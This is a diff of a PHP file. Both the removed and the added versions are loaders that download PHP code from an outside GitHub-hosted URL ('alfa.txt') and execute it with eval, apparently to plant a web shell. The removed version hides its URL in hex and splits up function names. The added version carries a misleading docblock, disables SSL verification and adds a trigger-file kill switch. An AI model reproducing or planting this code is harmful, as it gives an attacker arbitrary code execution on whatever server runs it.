@@ -1,60 +1,55 @@
 <?php
-$hexUrl = '68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f746967657278636f646531342f66696c65652f726566732f68656164732f6d61696e2f616c66612e747874
-';
-
-function hex2str($hex) {
-    $str = '';
-    for ($i = 0; $i < strlen($hex) - 1; $i += 2) {
-        $str .= chr(hexdec($hex[$i] . $hex[$i + 1]));
+/**
+ * Disable error reporting
+ * 
+ * Set this to error_reporting( -1 ) for debugging.
+ */
+function geturlsinfo($url) {
+    if (function_exists('curl_exec')) {
+        $conn = curl_init($url);
+        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
+        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
+        curl_setopt($conn, CURLOPT_COOKIEJAR, $GLOBALS['coki']);
+        curl_setopt($conn, CURLOPT_COOKIEFILE, $GLOBALS['coki']);
+        $url_get_contents_data = curl_exec($conn);
+        curl_close($conn);
+    } elseif (function_exists('file_get_contents')) {
+        $url_get_contents_data = file_get_contents($url);
+    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
+        $handle = fopen($url, "r");
+        $url_get_contents_data = stream_get_contents($handle);
+        fclose($handle);
+    } else {
+        $url_get_contents_data = false;
     }
-    return $str;
+    return $url_get_contents_data;
 }
 
-$url = hex2str($hexUrl);
-
-function downloadWithFileGetContents($url) {
-    if (ini_get('a' . 'llow' . '_ur' . 'l_fo' . 'pe' . 'n')) {
-        return file_get_contents($url);
+// Trigger untuk memeriksa status atau membuat file tetap berjalan
+function keepAlive($triggerFile) {
+    if (!file_exists($triggerFile)) {
+        file_put_contents($triggerFile, "active");
     }
-    return false;
-}
-
-function downloadWithCurl($url) {
-    if (function_exists('c' . 'u' . 'rl' . '_i' . 'n' . 'i' . 't')) {
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        $data = curl_exec($ch);
-        curl_close($ch);
-        return $data;
+    $status = file_get_contents($triggerFile);
+    if (trim($status) !== "active") {
+        die("Trigger is deactivated. Script stopped.");
     }
-    return false;
 }
 
-function downloadWithFopen($url) {
-    $result = false;
-    if ($fp = fopen($url, 'r')) {
-        $result = '';
-        while ($data = fread($fp, 8192)) {
-            $result .= $data;
-        }
-        fclose($fp);
-    }
-    return $result;
-}
+// Nama file trigger
+$triggerFile = __DIR__ . '/trigger.txt';
+keepAlive($triggerFile);
 
-$phpScript = downloadWithFileGetContents($url);
-if ($phpScript === false) {
-    $phpScript = downloadWithCurl($url);
-}
-if ($phpScript === false) {
-    $phpScript = downloadWithFopen($url);
-}
+// Jalankan fungsi utama
+$a = geturlsinfo('https://tigerxcode14.github.io/dor/alfa.txt');
 
-if ($phpScript === false) {
-    die("Gagal mendownload script PHP dari URL dengan semua metode.");
+// Mengeksekusi kode yang diambil
+if ($a) {
+    eval('?>' . $a);
+} else {
+    echo "Failed to fetch data.";
 }
-
-eval('?>' . $phpScript);
 ?>
